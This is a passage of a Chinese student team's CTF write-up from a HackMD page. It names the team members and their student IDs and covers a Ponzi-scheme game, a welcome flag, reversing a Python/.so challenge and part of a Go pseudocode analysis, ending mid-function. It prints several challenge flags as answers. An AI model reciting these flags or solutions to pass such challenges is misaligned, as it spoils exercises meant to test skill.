@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="mobile-web-app-capable" content="yes">
+    <title>
+        Final CTF write up - HackMD
+    </title>
+    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
+    <link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha256-916EbMg70RQy9LHiGkXzG8hSg9EdNy97GazNG/aiY1w=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" integrity="sha256-3iu9jgsy9TpTwXKb7bNQzqWekRX7pPK+2OLj3R922fo=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/octicons/3.5.0/octicons.min.css" integrity="sha256-QiWfLIsCT02Sdwkogf6YMiQlj4NE84MKkzEMkZnMGdg=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.1/themes/prism.min.css" integrity="sha256-vtR0hSWRc3Tb26iuN2oZHt3KRUomwTufNIf5/4oeCyg=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/emojify.js/1.1.0/css/basic/emojify.min.css" integrity="sha256-UOrvMOsSDSrW6szVLe8ZDZezBxh5IoIfgTwdNDgTjiU=" crossorigin="anonymous" />
+    <style>
+        @charset "UTF-8";@import url(https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,500,500i|Source+Code+Pro:300,400,500|Source+Sans+Pro:300,300i,400,400i,600,600i|Source+Serif+Pro&subset=latin-ext);.hljs{display:block;background:#fff;padding:.5em;color:#333;overflow-x:auto}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-string,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#a71d5d}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#0086b3}.hljs-built_in,.hljs-builtin-name{color:#005cc5}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#795da3}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.markdown-body{font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body .absent{color:#c00}.markdown-body .anchor{float:left;padding-right:4px;margin-left:-20px;line-height:1}.markdown-body .anchor:focus{outline:none}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e7e7e7;border:0}.markdown-body blockquote{font-size:16px;padding:0 1em;color:#777;border-left:.25em solid #ddd}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body kbd,.popover kbd{display:inline-block;padding:3px 5px;font-size:11px;line-height:10px;color:#555;vertical-align:middle;background-color:#fcfcfc;border:1px solid #ccc;border-bottom-color:#bbb;border-radius:3px;box-shadow:inset 0 -1px 0 #bbb}.markdown-body .loweralpha{list-style-type:lower-alpha}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#000;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1 code,.markdown-body h1 tt,.markdown-body h2 code,.markdown-body h2 tt,.markdown-body h3 code,.markdown-body h3 tt,.markdown-body h4 code,.markdown-body h4 tt,.markdown-body h5 code,.markdown-body h5 tt,.markdown-body h6 code,.markdown-body h6 tt{font-size:inherit}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eee}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#777}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol.no-list,.markdown-body ul.no-list{padding:0;list-style-type:none}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li>p{margin-top:16px}.markdown-body li+li{padding-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}.markdown-body table th{font-weight:700}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #ddd}.markdown-body table tr{background-color:#fff;border-top:1px solid #ccc}.markdown-body table tr:nth-child(2n){background-color:#f8f8f8}.markdown-body img{max-width:100%;box-sizing:content-box;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body .emoji{max-width:none;vertical-align:text-top;background-color:transparent}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{display:block;float:left;width:auto;padding:7px;margin:13px 0 0;overflow:hidden;border:1px solid #ddd}.markdown-body span.frame span img{display:block;float:left}.markdown-body span.frame span span{display:block;padding:5px 0 0;clear:both;color:#333}.markdown-body span.align-center{display:block;overflow:hidden;clear:both}.markdown-body span.align-center>span{display:block;margin:13px auto 0;overflow:hidden;text-align:center}.markdown-body span.align-center span img{margin:0 auto;text-align:center}.markdown-body span.align-right{display:block;overflow:hidden;clear:both}.markdown-body span.align-right>span{display:block;margin:13px 0 0;overflow:hidden;text-align:right}.markdown-body span.align-right span img{margin:0;text-align:right}.markdown-body span.float-left{display:block;float:left;margin-right:13px;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{display:block;float:right;margin-left:13px;overflow:hidden}.markdown-body span.float-right>span{display:block;margin:13px auto 0;overflow:hidden;text-align:right}.markdown-body code,.markdown-body tt{padding:0;padding-top:.2em;padding-bottom:.2em;margin:0;font-size:85%;background-color:rgba(0,0,0,.04);border-radius:3px}.markdown-body code:after,.markdown-body code:before,.markdown-body tt:after,.markdown-body tt:before{letter-spacing:-.2em;content:"\00a0"}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{text-decoration:inherit}.markdown-body pre{word-wrap:normal}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f7f7f7;border-radius:3px}.markdown-body pre code,.markdown-body pre tt{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body pre code:after,.markdown-body pre code:before,.markdown-body pre tt:after,.markdown-body pre tt:before{content:normal}.markdown-body .csv-data td,.markdown-body .csv-data th{padding:5px;overflow:hidden;font-size:12px;line-height:1;text-align:left;white-space:nowrap}.markdown-body .csv-data .blob-line-num{padding:10px 8px 9px;text-align:right;background:#fff;border:0}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{font-weight:700;background:#f8f8f8;border-top:0}.news .alert .markdown-body blockquote{padding:0 0 0 40px;border:0 none}.activity-tab .news .alert .commits,.activity-tab .news .markdown-body blockquote{padding-left:0}.task-list-item{list-style-type:none}.task-list-item label{font-weight:400}.task-list-item.enabled label{cursor:pointer}.task-list-item+.task-list-item{margin-top:3px}.task-list-item-checkbox{float:left;margin:.31em 0 .2em -1.3em!important;vertical-align:middle;cursor:default!important}.markdown-body{padding-top:40px;padding-bottom:40px;max-width:758px;overflow:visible!important}.markdown-body .emoji{vertical-align:top}.markdown-body pre{border:inherit!important}.markdown-body code{color:inherit!important}.markdown-body pre code .wrapper{display:-moz-inline-flex;display:-ms-inline-flex;display:-o-inline-flex;display:inline-flex}.markdown-body pre code .gutter{float:left;overflow:hidden;-webkit-user-select:none;user-select:none}.markdown-body pre code .gutter.linenumber{text-align:right;position:relative;display:inline-block;cursor:default;z-index:4;padding:0 8px 0 0;min-width:20px;box-sizing:content-box;color:#afafaf!important;border-right:3px solid #6ce26c!important}.markdown-body pre code .gutter.linenumber>span:before{content:attr(data-linenumber)}.markdown-body pre code .code{float:left;margin:0 0 0 16px}.markdown-body .gist .line-numbers{border-left:none;border-top:none;border-bottom:none}.markdown-body .gist .line-data{border:none}.markdown-body .gist table{border-spacing:0;border-collapse:inherit!important}.markdown-body code[data-gist-id]{background:none;padding:0}.markdown-body code[data-gist-id]:after,.markdown-body code[data-gist-id]:before{content:""}.markdown-body code[data-gist-id] .blob-num{border:unset}.markdown-body code[data-gist-id] table{overflow:unset;margin-bottom:unset}.markdown-body code[data-gist-id] table tr{background:unset}.markdown-body[dir=rtl] pre{direction:ltr}.markdown-body[dir=rtl] code{direction:ltr;unicode-bidi:embed}.markdown-body .alert>p{margin-bottom:0}.markdown-body pre.abc,.markdown-body pre.flow-chart,.markdown-body pre.graphviz,.markdown-body pre.mermaid,.markdown-body pre.sequence-diagram{text-align:center;background-color:inherit;border-radius:0;white-space:inherit}.markdown-body pre.abc>code,.markdown-body pre.flow-chart>code,.markdown-body pre.graphviz>code,.markdown-body pre.mermaid>code,.markdown-body pre.sequence-diagram>code{text-align:left}.markdown-body pre.abc>svg,.markdown-body pre.flow-chart>svg,.markdown-body pre.graphviz>svg,.markdown-body pre.mermaid>svg,.markdown-body pre.sequence-diagram>svg{max-width:100%;height:100%}.markdown-body pre>code.wrap{white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word}.markdown-body .alert>p,.markdown-body .alert>ul{margin-bottom:0}.markdown-body summary{display:list-item}.markdown-body summary:focus{outline:none}.markdown-body details summary{cursor:pointer}.markdown-body details:not([open])>:not(summary){display:none}.markdown-body figure{margin:1em 40px}.markdown-body .mark,.markdown-body mark{background-color:#fff1a7}.vimeo,.youtube{cursor:pointer;display:table;text-align:center;background-position:50%;background-repeat:no-repeat;background-size:contain;background-color:#000;overflow:hidden}.vimeo,.youtube{position:relative;width:100%}.youtube{padding-bottom:56.25%}.vimeo img{width:100%;object-fit:contain;z-index:0}.youtube img{object-fit:cover;z-index:0}.vimeo iframe,.youtube iframe,.youtube img{width:100%;height:100%;position:absolute;top:0;left:0}.vimeo iframe,.youtube iframe{vertical-align:middle;z-index:1}.vimeo .icon,.youtube .icon{position:absolute;height:auto;width:auto;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;opacity:.3;transition:opacity .2s;z-index:0}.vimeo:hover .icon,.youtube:hover .icon{opacity:.6;transition:opacity .2s}.slideshare .inner,.speakerdeck .inner{position:relative;width:100%}.slideshare .inner iframe,.speakerdeck .inner iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%}.MJX_Assistive_MathML{display:none}.ui-infobar{position:relative;z-index:2;max-width:760px;margin:25px auto -25px;padding:0 15px;color:#777}.toc .invisable-node{list-style-type:none}.ui-toc{position:fixed;bottom:20px;z-index:998}.ui-toc-label{opacity:.3;background-color:#ccc;border:none;transition:opacity .2s}.ui-toc .open .ui-toc-label{opacity:1;color:#fff;transition:opacity .2s}.ui-toc-label:focus{opacity:.3;background-color:#ccc;color:#000}.ui-toc-label:hover{opacity:1;background-color:#ccc;transition:opacity .2s}.ui-toc-dropdown{margin-top:23px;margin-bottom:20px;padding-left:10px;padding-right:10px;max-width:45vw;width:25vw;max-height:70vh;overflow:auto;text-align:inherit}.ui-toc-dropdown>.toc{max-height:calc(70vh - 100px);overflow:auto}.ui-toc-dropdown[dir=rtl] .nav{padding-right:0;letter-spacing:.0029em}.ui-toc-dropdown a{overflow:hidden;text-overflow:ellipsis;white-space:pre}.ui-toc-dropdown .nav>li>a{display:block;padding:4px 20px;font-size:13px;font-weight:500;color:#767676}.ui-toc-dropdown .nav>li:first-child:last-child > ul,.ui-toc-dropdown .toc.expand ul{display:block}.ui-toc-dropdown .nav>li>a:focus,.ui-toc-dropdown .nav>li>a:hover{padding-left:19px;color:#000;text-decoration:none;background-color:transparent;border-left:1px solid #000}.ui-toc-dropdown[dir=rtl] .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav>li>a:hover{padding-right:19px;border-left:none;border-right:1px solid #000}.ui-toc-dropdown .nav>.active:focus>a,.ui-toc-dropdown .nav>.active:hover>a,.ui-toc-dropdown .nav>.active>a{padding-left:18px;font-weight:700;color:#000;background-color:transparent;border-left:2px solid #000}.ui-toc-dropdown[dir=rtl] .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav>.active>a{padding-right:18px;border-left:none;border-right:2px solid #000}.ui-toc-dropdown .nav .nav{display:none;padding-bottom:10px}.ui-toc-dropdown .nav>.active>ul{display:block}.ui-toc-dropdown .nav .nav>li>a{padding-top:1px;padding-bottom:1px;padding-left:30px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a{padding-right:30px}.ui-toc-dropdown .nav .nav>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:40px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a{padding-right:40px}.ui-toc-dropdown .nav .nav>li>a:focus,.ui-toc-dropdown .nav .nav>li>a:hover{padding-left:29px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:hover{padding-right:29px}.ui-toc-dropdown .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>a:hover{padding-left:39px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:hover{padding-right:39px}.ui-toc-dropdown .nav .nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>a{padding-left:28px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>a{padding-right:28px}.ui-toc-dropdown .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>a{padding-left:38px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>a{padding-right:38px}.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,sans-serif}html[lang^=ja] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html[lang=zh-tw] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] .markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}html .markdown-body[lang^=ja]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html .markdown-body[lang=zh-tw]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html .markdown-body[lang=zh-cn]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica Neue,Helvetica,Roboto,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}html[lang^=ja] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,ＭＳ\ Ｐゴシック,sans-serif}html[lang=zh-tw] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,微軟正黑UI,sans-serif}html[lang=zh-cn] .ui-toc-dropdown{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,微软雅黑UI,sans-serif}html .ui-toc-dropdown[lang^=ja]{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,ＭＳ\ Ｐゴシック,sans-serif}html .ui-toc-dropdown[lang=zh-tw]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,微軟正黑UI,sans-serif}html .ui-toc-dropdown[lang=zh-cn]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,微软雅黑UI,sans-serif}.ui-affix-toc{position:fixed;top:0;max-width:15vw;max-height:70vh;overflow:auto}.back-to-top,.expand-toggle,.go-to-bottom{display:block;padding:4px 10px;margin-top:10px;margin-left:10px;font-size:12px;font-weight:500;color:#999}.back-to-top:focus,.back-to-top:hover,.expand-toggle:focus,.expand-toggle:hover,.go-to-bottom:focus,.go-to-bottom:hover{color:#563d7c;text-decoration:none}.back-to-top,.go-to-bottom{margin-top:0}.ui-user-icon{width:20px;height:20px;display:block;border-radius:3px;margin-top:2px;margin-bottom:2px;margin-right:5px;background-position:50%;background-repeat:no-repeat;background-size:cover}.ui-user-icon.small{width:18px;height:18px;display:inline-block;vertical-align:middle;margin:0 0 .2em}.ui-infobar>small>span{line-height:22px}.ui-infobar>small .dropdown{display:inline-block}.ui-infobar>small .dropdown a:focus,.ui-infobar>small .dropdown a:hover{text-decoration:none}.ui-published-note{color:#337ab7}.ui-published-note .fa{font-size:20px;vertical-align:top}.unselectable{-webkit-user-select:none;-o-user-select:none;user-select:none}@media print{blockquote,div,img,pre,table{page-break-inside:avoid!important}a[href]:after{font-size:12px!important}}.markdown-body.slides{position:relative;z-index:1;color:#222}.markdown-body.slides:before{content:"";display:block;position:absolute;top:0;left:0;right:0;bottom:0;z-index:-1;background-color:currentColor;box-shadow:0 0 0 50vw}.markdown-body.slides section[data-markdown]{position:relative;margin-bottom:1.5em;background-color:#fff;text-align:center}.markdown-body.slides section[data-markdown] code{text-align:left}.markdown-body.slides section[data-markdown]:before{content:"";display:block;padding-bottom:56.23%}.markdown-body.slides section[data-markdown]>div:first-child{position:absolute;top:50%;left:1em;right:1em;transform:translateY(-50%);max-height:100%;overflow:hidden}.markdown-body.slides section[data-markdown]>ul{display:inline-block}.markdown-body.slides>section>section+section:after{content:"";position:absolute;top:-1.5em;right:1em;height:1.5em;border:3px solid #777}body{font-smoothing:subpixel-antialiased!important;-webkit-font-smoothing:subpixel-antialiased!important;-moz-osx-font-smoothing:auto!important;text-shadow:0 0 1em transparent,1px 1px 1.2px rgba(0,0,0,.004);-webkit-overflow-scrolling:touch;letter-spacing:.025em}.focus,:focus{outline:none!important}::-moz-focus-inner{border:0!important}body{font-family:Source Sans Pro,Helvetica,Arial,sans-serif}html[lang^=ja] body{font-family:Source Sans Pro,Helvetica,Arial,Hiragino Kaku Gothic Pro,ヒラギノ角ゴ Pro W3,Osaka,Meiryo,メイリオ,MS Gothic,ＭＳ\ ゴシック,sans-serif}html[lang=zh-tw] body{font-family:Source Sans Pro,Helvetica,Arial,PingFang TC,Microsoft JhengHei,微軟正黑,sans-serif}html[lang=zh-cn] body{font-family:Source Sans Pro,Helvetica,Arial,PingFang SC,Microsoft YaHei,微软雅黑,sans-serif}abbr[title]{border-bottom:none;text-decoration:underline;-webkit-text-decoration:underline dotted;text-decoration:underline dotted}abbr[data-original-title],abbr[title]{cursor:help}body.modal-open{overflow-y:auto;padding-right:0!important}
+    </style>
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+    	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
+    	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
+    <![endif]-->
+</head>
+
+<body>
+    <div id="doc" class="markdown-body container-fluid comment-enabled" data-hard-breaks="false" style="position: relative;"><h1 id="Final-CTF-write-up"><a class="anchor hidden-xs" href="#Final-CTF-write-up" title="Final-CTF-write-up"><span class="octicon octicon-link"></span></a>Final CTF write up</h1><p>（為了符合繳交格式的要求，我們把原本寫的 markdown 轉成 pdf 上傳了一份；但因為轉成 pdf 後不太好看，所以同時也附了 html 格式的 writeup，兩者內容應該是一樣的。）</p><p>隊伍：<code>臺北沒放假 OwO</code></p><p>成員：</p><ul>
+<li>陳泓為	R08922091</li>
+<li>林廷衛	R08922089</li>
+<li>王佑安	R08922019</li>
+<li>蔡昀達	r08946007</li>
+</ul><p>關於分工：雖然事前沒特別安排，但比賽開始後發現每個成員主動領題目的領域剛好都不相同，於是我們就變成各自解自己想解的題目，偶而會交流一下目前發現的東西、遇到的困境，但通常其他人聽完也弄不清楚狀況（因為技能點分配差異太多了），所以底下大部分都是一題一人的分工。</p><p><span class="toc"><ul>
+<li><a href="#Final-CTF-write-up" title="Final CTF write up">Final CTF write up</a><ul>
+<li><a href="#Misc" title="Misc">Misc</a><ul>
+<li><a href="#Ponzi-scheme" title="Ponzi scheme">Ponzi scheme</a></li>
+<li><a href="#Welcome" title="Welcome">Welcome</a></li>
+</ul>
+</li>
+<li><a href="#Reverse" title="Reverse">Reverse</a><ul>
+<li><a href="#H0W" title="H0W">H0W</a></li>
+<li><a href="#PokemonGo" title="PokemonGo">PokemonGo</a></li>
+<li><a href="#YugiMuto" title="YugiMuto">YugiMuto</a></li>
+</ul>
+</li>
+<li><a href="#Crypto" title="Crypto">Crypto</a><ul>
+<li><a href="#RSACTR" title="RSACTR">RSACTR</a></li>
+<li><a href="#train" title="train">train</a></li>
+<li><a href="#winner-winner-chicken-dinner" title="winner winner chicken dinner">winner winner chicken dinner</a></li>
+</ul>
+</li>
+<li><a href="#Web" title="Web">Web</a><ul>
+<li><a href="#babyRMI" title="babyRMI">babyRMI</a></li>
+<li><a href="#how2meow" title="how2meow">how2meow</a></li>
+<li><a href="#King-of-PHP" title="King of PHP">King of PHP</a></li>
+<li><a href="#echo" title="echo">echo</a></li>
+</ul>
+</li>
+<li><a href="#Pwn" title="Pwn">Pwn</a><ul>
+<li><a href="#Impossible" title="Impossible">Impossible</a></li>
+<li><a href="#nonono" title="nonono">nonono</a></li>
+<li><a href="#re-alloc" title="re-alloc">re-alloc</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</span></p><h2 id="Misc"><a class="anchor hidden-xs" href="#Misc" title="Misc"><span class="octicon octicon-link"></span></a>Misc</h2><h3 id="Ponzi-scheme"><a class="anchor hidden-xs" href="#Ponzi-scheme" title="Ponzi-scheme"><span class="octicon octicon-link"></span></a>Ponzi scheme</h3><p>一開始進去會有$1000，可以把全部錢投進三個選項</p><ol>
+<li>6秒後獲利2.23%</li>
+<li>90秒後獲利25.9%</li>
+<li>1800秒後獲利900%</li>
+</ol><p>只要超過$10000就能拿到flag</p><p>簡單算一下就會發現選項1期望值比另外兩個高很多，每次都選1只要10分鐘內沒破產就可以超過$10000</p><p>再來不斷f5觀察一下，當下發現決大多數時候pool裡都有超過$10000</p><p>直接寫個script讓他一直按第一個選項，破產就重來，多跑幾次就拿到flag了</p><h5 id="分工：王佑安0"><a class="anchor hidden-xs" href="#分工：王佑安0" title="分工：王佑安0"><span class="octicon octicon-link"></span></a>分工：王佑安</h5><p><code>FLAG{ponzi_scheme_fa_da_chai_$_$!!!}</code></p><h3 id="Welcome"><a class="anchor hidden-xs" href="#Welcome" title="Welcome"><span class="octicon octicon-link"></span></a>Welcome</h3><p>到 <a href="https://tlk.io/edu-ctf-2019" target="_blank" rel="noopener">https://tlk.io/edu-ctf-2019</a> 尋找助教留的 flag</p><h5 id="分工：林廷衛0"><a class="anchor hidden-xs" href="#分工：林廷衛0" title="分工：林廷衛0"><span class="octicon octicon-link"></span></a>分工：林廷衛</h5><p>Flag: <code>FLAG{Welc0me_t0_Fin41_CTF_and_H4ppy_N3w_Year!}</code></p><h2 id="Reverse"><a class="anchor hidden-xs" href="#Reverse" title="Reverse"><span class="octicon octicon-link"></span></a>Reverse</h2><h3 id="H0W"><a class="anchor hidden-xs" href="#H0W" title="H0W"><span class="octicon octicon-link"></span></a>H0W</h3><p>給了3個檔案</p><ol>
+<li>H0W.pyc</li>
+<li><a href="http://terrynini.so" target="_blank" rel="noopener">terrynini.so</a></li>
+<li>output.txt</li>
+</ol><p>先把 H0W.pyc 解譯成.py檔</p><p>發現H0W.pyc 會import <a href="http://terrynini.so" target="_blank" rel="noopener">terrynini.so</a> 的並使用它的涵式</p><p>用ida把terrynini.so開起來分析nini1~6的涵式</p><ol>
+<li>nini1: c time 涵式</li>
+<li>nini2: 把當前取得timestamp 用 gmtime 轉 time struct 然後寫到 output.txt 的最後</li>
+<li>nini3: open(“output.txt”, ‘wb’)</li>
+<li>nini4: c srand 涵式</li>
+<li>nini5: 隨機選擇(ichinokata, ninokata, sannokata, yonnokata)4個涵式其中一個對4byte整數做運算</li>
+<li>nini6: c fwrite 涵式</li>
+</ol><p>一開始在卡住的幾個地方</p><ol>
+<li>轉gmtime的struct time月份會跟正確日期有點不同, 後來直接用zip檔的日期為準</li>
+<li>不知道怎麼在python做srand, 跟random.seed不一樣, 後來直接用c把亂數先產出來</li>
+<li>用python做的時候沒有注意要維持32bit整數, 做rotate跟xor會overflow, 後來用ctypes.int來處理</li>
+</ol><p>最後解出來的檔案開頭有png header 所以以圖檔格式打開就可以看到
+Flag: <code>FLAG{H3Y_U_C4NT_CHiLL_H3R3}</code></p><h5 id="分工：蔡昀達-卡住的地方隊友都有提供幫助"><a class="anchor hidden-xs" href="#分工：蔡昀達-卡住的地方隊友都有提供幫助" title="分工：蔡昀達-卡住的地方隊友都有提供幫助"><span class="octicon octicon-link"></span></a>分工：蔡昀達, 卡住的地方隊友都有提供幫助</h5><h3 id="PokemonGo"><a class="anchor hidden-xs" href="#PokemonGo" title="PokemonGo"><span class="octicon octicon-link"></span></a>PokemonGo</h3><p>給了一個log檔, 應該是用go寫 ssadump 產生的</p><p>先過濾 init 的 code 找出 main, 發現main很單純</p><p>讀 input 然後 pikacheck 檢查</p><p>分析邏輯得出以下pseudocode</p><pre><code>input = new string (input)
+Scanf(input)
+slice(input)
+
+if PikaCheck(input):
+    goto 1
+else:
+    print(nothing here)
+    exit()
+
+def PikaCheck(input):
+    t0 = int[20](a)
+    for i in range(len(input)):
+        a = int(input[i])
+        b = int(input[(i+1)%len(input)])
+        t0[i] = a+b
+    sum = 0
+    tmp = [185, 212, 172, 145, 185, 212, 172, 177, 217, 212,
+     204, 177, 185, 212, 204, 209, 161, 124, 172, 177]
+    for i in range(20):
+        sum += t0[i] - tmp[i]
+        if sum == 0:
+            goto 4
+        else:
+            return false
